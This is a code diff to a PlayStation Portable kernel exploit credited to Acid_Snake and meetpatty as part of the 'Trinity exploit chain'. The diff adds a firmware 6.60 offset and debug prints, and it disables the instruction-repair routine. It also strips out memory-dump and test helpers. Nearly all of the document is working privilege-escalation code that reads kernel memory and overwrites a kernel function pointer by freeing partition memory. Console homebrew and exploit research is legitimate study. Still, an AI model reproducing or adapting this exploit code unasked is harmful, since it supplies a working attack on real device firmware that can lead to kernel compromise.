@@ -23,10 +23,7 @@ Part of Trinity exploit chain.
 Put together by Acid_Snake and meetpatty.
 */
 
-
-#define DUMP_PATH "ms0:/kram.bin"
-#define BUF_SIZE 10*1024 // 10KB buffer to minimize IO
-
+#define LIBC_CLOCK_OFFSET_660  0x88014400
 #define LIBC_CLOCK_OFFSET_360  0x88014D80
 #define LIBC_CLOCK_OFFSET_365  0x88014D00
 #define SYSMEM_SEED_OFFSET_365 0x88014E38
@@ -90,10 +87,12 @@ u32 readKram(u32 addr){
 }
 
 void repairInstruction(KernelFunctions* k_tbl) {
+  /*
     SceModule2 *mod = k_tbl->KernelFindModuleByName("sceRTC_Service");
     _sw(mod->text_addr + 0x3904, libc_clock_offset);
     k_tbl->KernelIcacheInvalidateAll();
     k_tbl->KernelDcacheWritebackInvalidateAll(); 
+  */
 }
 
 int stubScanner(UserFunctions* tbl){
@@ -106,19 +105,9 @@ int stubScanner(UserFunctions* tbl){
     g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
     _sceNpCore_8AFAB4A0 = tbl->FindImportUserRam("sceNpCore", 0x8AFAB4A0);
 
+    PRTSTR1("_sceNpCore_8AFAB4A0: %p", _sceNpCore_8AFAB4A0);
+
     return 0;
-}
-
-int checkPlantUID(int uid){
-  u32 addr = 0x88000000 + ((uid >> 5) & ~3);
-  u32 data = readKram(addr);
-  return (data == libc_clock_offset - 4);
-}
-
-void dumpBuf(char* path, void* buf, int size){
-  int fd = g_tbl->IoOpen(path, PSP_O_WRONLY|PSP_O_CREAT|PSP_O_TRUNC, 0777);
-  g_tbl->IoWrite(fd, buf, size);
-  g_tbl->IoClose(fd);
 }
 
 /*
@@ -132,9 +121,13 @@ int doExploit(void) {
 
     if (_sceNpCore_8AFAB4A0 != NULL){
       u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
+      PRTSTR1("test_val: %p", test_val);
       if (test_val == 0x8F154E38){
         seed = readKram(SYSMEM_SEED_OFFSET_365);
         libc_clock_offset = LIBC_CLOCK_OFFSET_365;
+      }
+      else if (test_val == 0x8FBF003C){
+        libc_clock_offset = LIBC_CLOCK_OFFSET_660;
       }
     }
 
@@ -157,26 +150,10 @@ int doExploit(void) {
 
     g_tbl->KernelDcacheWritebackAll();
 
-    //dumpBuf("ms0:/dummyaddr.bin", &dummyaddr, sizeof(dummyaddr));
-    //dumpBuf("ms0:/newaddr.bin", &newaddr, sizeof(newaddr));
-
     // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
     res = g_tbl->KernelFreePartitionMemory(uid);
 
     g_tbl->KernelDcacheWritebackAll();
-
-    /*
-    int (*CtrlReadBufferPositive)(SceCtrlData *, int) = NULL;
-    CtrlReadBufferPositive = g_tbl->FindImportUserRam("sceCtrl", 0x1F803938);
-    u32 EXIT_MASK = (PSP_CTRL_START | PSP_CTRL_UP);
-    while (1){
-      SceCtrlData pad_data;
-  	  CtrlReadBufferPositive(&pad_data, 1);
-      if((pad_data.Buttons & EXIT_MASK) == EXIT_MASK){
-        break;
-      }
-    }
-    */
    
     if (res < 0) return res;
 
